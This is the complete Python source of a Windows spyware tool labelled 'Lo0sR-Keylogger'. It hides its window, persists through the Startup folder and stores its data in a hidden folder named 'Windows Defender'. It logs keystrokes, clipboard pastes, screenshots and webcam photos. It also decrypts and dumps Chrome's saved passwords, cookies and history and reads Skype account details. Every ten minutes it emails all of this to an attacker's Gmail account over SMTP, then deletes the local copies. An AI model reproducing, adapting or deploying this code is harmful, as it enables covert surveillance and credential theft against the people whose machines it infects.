import os
import time
import psutil
import shutil
import pyHook
import smtplib
import sqlite3
import win32con
import win32api
import win32gui
import mimetypes
import pythoncom
import win32crypt
import win32console
from ctypes import *
import win32clipboard
from os import getenv
from Queue import Queue
from PIL import ImageGrab
from threading import Thread
from SimpleCV import Camera
from email.utils import formatdate
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from datetime import datetime, timedelta
from email.mime.multipart import MIMEMultipart

NUMBER_OF_THREADS = 7
JOB_NUMBER = [1, 2, 3, 4, 5, 6, 7]
queue = Queue()

PROCNAME = "chrome.exe"

# KEYLOGGER CONFIG
# Output Config
path_to_files = "C:/Users/" + win32api.GetUserName() + "/Documents/Windows Defender/"
file_name = path_to_files + "log.txt"
path_to_images = path_to_files + "IMAGES/"

# CAMERA CONFIG

# Screenshot
# interval in sec
interval_screenshot = 120

# WebCam
# interval in sec
interval_webcam = 120

# MAIL CONFIG
files = [path_to_files + "log.txt", ]

FromConf = 'username@gmail.com'
ToConf = 'username@gmail.com'
passwordConf = 'password'

intervalMail = 600

# Window Config
curr_window = None


class Startup:
    def hide(self):
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)

    def add_to_startup(self):
        path = "C:\\Users\\" + win32api.GetUserName() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        if os.path.isfile(path + __file__) == True:
            pass
        else:
            shutil.copy(os.getcwd() + __file__, path)

    def create_hidden_folder(self):
        if os.path.exists(path_to_files):
            pass
        else:
            os.makedirs(path_to_files)
            win32api.SetFileAttributes(path_to_files, win32con.FILE_ATTRIBUTE_HIDDEN)

    def kill_chrome(self):
        for proc in psutil.process_iter():
            try:
                if proc.name() == PROCNAME:
                    proc.kill()
            except:
                pass

    def make_dirs(self):
        if not os.path.exists(path_to_files + "SKYPE"):
            os.mkdir(path_to_files + "SKYPE")
        if not os.path.exists(path_to_files + "IMAGES"):
            os.mkdir(path_to_files + "IMAGES")
        if not os.path.exists(path_to_files + "CHROME"):
            os.mkdir(path_to_files + "CHROME")
        if not os.path.exists(path_to_files + "FIREFOX"):
            os.mkdir(path_to_files + "FIREFOX")

    def run(self):
        self.hide()
        self.add_to_startup()
        self.create_hidden_folder()
        self.make_dirs()
        self.kill_chrome()


class Keylogger:
    def get_curr_window(self):
        user32 = windll.user32
        kernel32 = windll.kernel32
        hwnd = user32.GetForegroundWindow()
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = "%d" % pid.value
        executable = create_string_buffer("\x00" * 512)
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        window_title = create_string_buffer("\x00" * 512)
        length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
        pid_info = "\n[ PID %s - %s - %s ]" % (process_id, executable.value, window_title.value)
        kernel32.CloseHandle(hwnd)
        kernel32.CloseHandle(h_process)
        return pid_info

    def keydown(self, event):
        global data
        global curr_window
        if event.WindowName != curr_window:
            curr_window = event.WindowName
            fp = open(file_name, 'a')
            data = self.get_curr_window()
            fp.write(data + "\n")
            fp.close()

        if event.Ascii > 32 and event.Ascii < 127:
            fp = open(file_name, 'a')
            data = chr(event.Ascii)
            fp.write(data)
            fp.close()
        else:
            while event.Key == "Lcontrol" or "Rcontrol" and event.Key == "A":
                fp = open(file_name, 'a')
                fp.write("[SELECT-ALL]")
                fp.close()
                break
            while event.Key == "Lcontrol" or "Rcontrol" and event.Key == "C":
                fp = open(file_name, 'a')
                fp.write("[COPY]")
                fp.close()
                break
            while event.Key == "Lcontrol" or "Rcontrol" and event.Key == "V":
                win32clipboard.OpenClipboard()
                try:
                    data = "\n[PASTE] - %s\n" % win32clipboard.GetClipboardData()
                except TypeError:
                    pass
                win32clipboard.CloseClipboard()
                fp = open(file_name, 'a')
                fp.write(data)
                fp.close()
                break
            if event.Key == "Lshift" or "Rshift" or "Return" or "Back":
                fp = open(file_name, 'a')
                data = "[%s]" % event.Key
                fp.write(data)
                fp.close()
            else:
                fp = open(file_name, 'a')
                data = "\n[%s]\n" % event.Key
                fp.write(data)
                fp.close()

    def keylogger(self):
        obj = pyHook.HookManager()
        obj.KeyDown = self.keydown
        obj.HookKeyboard()
        obj.HookMouse()
        pythoncom.PumpMessages()

    def webcam_pic(self, interval_w):
        try:
            cam = Camera()
            while True:
                time.sleep(interval_w)
                cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
                scr = path_to_images + "webcam_" + cur_time + ".jpg"
                files.append(str(scr))
                img = cam.getImage()
                img.save(scr)
        except Exception as e:
            print e

    def screenshot(self, interval_scr):
        while True:
            try:
                time.sleep(interval_scr)
                cur_time = str(str(time.localtime().tm_year) + "_" + str(time.localtime().tm_mon) + "_" + str(time.localtime().tm_mday) + "_" + str(time.localtime().tm_hour) + "_" + str(time.localtime().tm_min) + "_" + str(time.localtime().tm_sec))
                scr = path_to_images + "screenshot_" + cur_time + ".png"
                files.append(str(scr))
                ImageGrab.grab().save(scr, "PNG")
            except Exception as e:
                print e

    def run(self):
        self.keylogger()


class Chrome:
    """
    Dump All Chrome Passwords
    Output:
        Website: some-website.com
        Username: some username for this website
        Password: password for this Username
    """
    def dump_passwords(self):
        con = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
        cur = con.cursor()
        cur.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cur.fetchall():
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            if password:
                site = 'Site: %s\n' % result[0]
                username = 'Username: %s\n' % result[1]
                password = 'Password: %s\n\n' % password
                with open(r'' + str(path_to_files) + 'CHROME/chrome_passwords.txt', 'a') as outputfile:
                    outputfile.write(site + username + password)
                    outputfile.close()
        files.append(path_to_files + 'CHROME/chrome_passwords.txt')

    def dump_history(self):
        con = sqlite3.connect(os.getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\history")
        cur = con.cursor()
        output_file = open(r'' + str(path_to_files) + 'CHROME/chrome_history.txt', 'a')
        cur.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cur.fetchall():
            output_file.write("Website: %s \n\t Title: %s \n\t Last Visited: %s \n\n" % (
            u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),
            u''.join(str(row[2])).encode('utf-8').strip()))
        output_file.close()
        files.append(path_to_files + 'CHROME/chrome_history.txt')

    def dump_cookies(self):
        con = sqlite3.connect(os.getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Cookies")
        cur = con.cursor()
        output_file = open(r''+ str(path_to_files) + 'CHROME/chrome_cookies.txt', 'a')
        cur.execute('SELECT host_key, name, value FROM Cookies')
        for row in cur.fetchall():
            output_file.write("Hostname: %s \n\t Name: %s \n\t Value: %s \n\n" % (u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),u''.join(row[2]).strip()))
        output_file.close()
        files.append(path_to_files + 'CHROME/chrome_cookies.txt')


class InternetExplorer:
    def dump_cookies(self):
        pass

    def dump_history(self):
        pass


class Firefox:
    db_files = ['', '', '']

    def dump_cookies(self):
        pass

    def dump_history(self):
        pass

    def dump_downloads(self):
        pass


class BrowserHandler:
    def chrome(self):
        Chrome().dump_cookies()
        Chrome().dump_history()
        Chrome().dump_passwords()

    def internet_explorer(self):
        pass

    def firefox(self):
        Firefox().dump_history()
        Firefox().dump_cookies()
        Firefox().dump_downloads()

    def run(self):
        if os.path.isdir(os.getenv("APPDATA") + "\..\Local\Google\Chrome"):
            self.chrome()
        if os.path.isdir(os.getenv("APPDATA") + "\..\Roaming\Mozilla\Firefox"):
            self.firefox()
        else:
            pass


class Skype:
    def get_skype_dir(self):
        base_dir = os.getenv("APPDATA") + "\..\Roaming\Skype"
        subdirectories = os.listdir(base_dir)
        for dir in subdirectories:
            if not (dir == 'Content' or dir == 'DataRv' or dir == 'My Skype Received Files' or dir == 'RootTools' or dir == 'shared.lck' or dir == 'shared.xml' or dir == 'shared_dynco' or dir == 'shared_httpfe'):
                return dir

    def dump_skype_info(self, uname):
        con = sqlite3.connect(os.getenv("APPDATA") + "\..\Roaming\Skype\%s\main.db" % uname)
        cur = con.cursor()
        output_file = open(r''+ str(path_to_files) + 'SKYPE/skype_data.txt', 'a')
        cur.execute('SELECT signin_name, skypename, fullname, birthday, gender, languages, country, province, phone_home, phone_office, phone_mobile, emails, homepage FROM Accounts')
        for result in cur.fetchall():
            birthday = datetime.fromtimestamp(result[3]).strftime('%Y-%m-%d')
            if result[4] == 1:
                gender = "Male"
            else:
                gender = "Female"
            general_info = "General Information:\n\tFull Name: %s\n\tBirthday: %s\n\tGender: %s\n\tLanguage: %s\n\tCountry: %s\n\tProvince: %s\n\n" % (result[2], birthday, gender, result[5], result[6], result[7])
            contact_info = "Contact Information:\n\tPhone Home: %s\n\tPhone Office: %s\n\tPhone Mobile: %s\n\tE-Mail: %s\n" % (result[8], result[9], result[10], result[11])
            output_file.write(general_info + contact_info)
        output_file.close()
        files.append(path_to_files + "SKYPE/skype_data.txt")
        con.close()

    def get_skype_info(self):
        if os.path.isdir(os.getenv("APPDATA") + "\..\Roaming\Skype"):
            skype_uname = self.get_skype_dir()
            self.dump_skype_info(skype_uname)
        else:
            pass

    def run(self):
        self.get_skype_info()


class MailHandler:
    def send_mail(self, From, to, password, interval_mail):
        while True:
            time.sleep(interval_mail)
            msg = MIMEMultipart()
            msg['From'] = From
            msg['To'] = to
            msg['Date'] = formatdate(localtime=True)
            msg['Subject'] = 'Lo0sR-Keylogger'
            msg.attach(MIMEText('Output'))
            try:
                smtp = smtplib.SMTP('smtp.gmail.com:587')
                smtp.starttls()
                smtp.login(From, password)
            except:
                login = 'failed'
            else:
                login = 'success'
            if login == 'success':
                for f in files:
                    f = f
                    ctype, encoding = mimetypes.guess_type(f)
                    if ctype is None or encoding is not None:
                        # No guess could be made, or the file is encoded (compressed), so
                        # use a generic bag-of-bits type.
                        ctype = 'application/octet-stream'
                    maintype, subtype = ctype.split('/', 1)
                    if maintype == 'text':
                        fp = open(f)
                        # Note: we should handle calculating the charset
                        part = MIMEText(fp.read(), _subtype=subtype)
                        fp.close()
                    elif maintype == 'image':
                        fp = open(f, 'rb')
                        part = MIMEImage(fp.read(), _subtype=subtype)
                        fp.close()
                    else:
                        fp = open(f, 'rb')
                        part = MIMEBase(maintype, subtype)
                        part.set_payload(fp.read())
                        fp.close()
                    part.add_header('Content-Disposition', 'attachment; filename="%s"' % f)
                    msg.attach(part)
                try:
                    smtp.sendmail(From, to, msg.as_string())
                    open(file_name, 'w').close()
                    with open(file_name, 'w') as fl:
                        fl.write('### Keylogger - Log ###\n')
                        fl.close()
                    for fi in files[1:]:
                        os.remove(fi)
                    del files[:]
                    files.append("output.txt")
                    smtp.close()
                except Exception:
                    pass
                    smtp.close()
            else:
                smtp.close()


class ThreadHandler:
    def create_workers(self):
        for _ in range(NUMBER_OF_THREADS):
            t = Thread(target=self.work)
            t.daemon = True
            t.start()

    def work(self):
        x = queue.get()
        if x == 1:
            Startup().run()
        if x == 2:
            Keylogger().run()
        if x == 3:
            MailHandler().send_mail(FromConf, ToConf, passwordConf, intervalMail)
        if x == 4:
            time.sleep(2)
            BrowserHandler().run()
        if x == 5:
            time.sleep(2)
            Skype().run()
        if x == 6:
            Keylogger().screenshot(interval_screenshot)
        if x == 7:
            Keylogger().webcam_pic(interval_webcam)
        queue.task_done()

    def create_jobs(self):
        for x in JOB_NUMBER:
            queue.put(x)
        queue.join()

    def run(self):
        self.create_workers()
        self.create_jobs()


if __name__ == '__main__':
    ThreadHandler().run()
